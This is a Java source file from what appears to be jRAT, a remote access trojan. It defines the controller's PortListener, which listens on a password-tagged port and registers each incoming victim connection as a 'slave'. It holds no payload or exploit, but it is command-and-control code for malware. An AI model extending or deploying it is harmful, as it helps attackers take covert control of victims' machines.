package io.jrat.client.net;

import io.jrat.client.AbstractSlave;
import io.jrat.client.Main;
import io.jrat.client.Slave;
import io.jrat.client.exceptions.CloseException;
import io.jrat.client.ui.panels.PanelMainLog;
import io.jrat.client.ui.panels.PanelMainSockets;

import java.net.ServerSocket;
import java.net.Socket;
import java.util.ArrayList;
import java.util.List;


public class PortListener implements Runnable {

	public static List<PortListener> listeners = new ArrayList<PortListener>();

	private ServerSocket server;
	private int timeout = 15 * 1000;
	private boolean listening = false;
	private String pass;
	private String name;
	private int port;

	public ServerSocket getServer() {
		return server;
	}

	public int getTimeout() {
		return timeout;
	}

	public boolean isListening() {
		return listening;
	}

	public String getPass() {
		return pass;
	}

	public String getName() {
		return name;
	}
	
	public int getPort() {
		return port;
	}

	public PortListener(String name, int port, int timeout, String pass) throws Exception {
		listeners.add(this);
		this.name = name;
		this.timeout = timeout;
		this.pass = pass;
		this.port = port;
		try {
			this.server = new ServerSocket(port);
		} catch (Exception ex) {
			ex.printStackTrace();
			PanelMainSockets.instance.getModel().addRow(new Object[] { "Not listening", name, port, timeout, pass });
		}
	}

	@Override
	public void run() {
		try {
			while (!server.isClosed()) {
				Socket socket = server.accept();
				
				// int type = socket.getInputStream().read(); TODO, removed for now to make jRAT backwards compatible
				
				AbstractSlave slave;
				
				/*if (type == ConnectionCodes.ANDROID_SLAVE) {
					slave = new AndroidSlave(this, socket);
				} else if (type == ConnectionCodes.DESKTOP_SLAVE) {
					slave = new Slave(this, socket);
				}*/
				
				slave = new Slave(this, socket);
				
				/*if (type < 0 || type > 1) {
					slave = new Slave(this, socket);
					PanelMainLog.instance.addEntry("Error", slave, "Invalid connection type");
					continue;
				}*/

				if (Main.liteVersion && Main.connections.size() >= 5) {
					slave = new Slave(this, socket);
					slave.closeSocket(new CloseException("Maximum of 5 connections reached"));
					PanelMainLog.instance.addEntry("Warning", slave, "Maximum of 5 connections reached");
					continue;
				}
			}
		} catch (Exception ex) {
			ex.printStackTrace();
		}
	}

	public void start() {
		PanelMainSockets.instance.getModel().addRow(new Object[] { "Listening", name, server.getLocalPort(), timeout, pass });

		new Thread(this, "Port " + server.getLocalPort()).start();
	}

	public static PortListener getListener(String name, int port, int timeout, String pass) {
		for (int i = 0; i < listeners.size(); i++) {
			PortListener con = listeners.get(i);
			if (con.name.equals(name) && con.pass.equals(pass) && con.port == port && con.getTimeout() == timeout) {
				return con;
			}
		}

		return null;
	}

	public static PortListener getListener(String name) {
		for (int i = 0; i < listeners.size(); i++) {
			PortListener con = listeners.get(i);
			if (con.name.equals(name)) {
				return con;
			}
		}

		return null;
	}

}
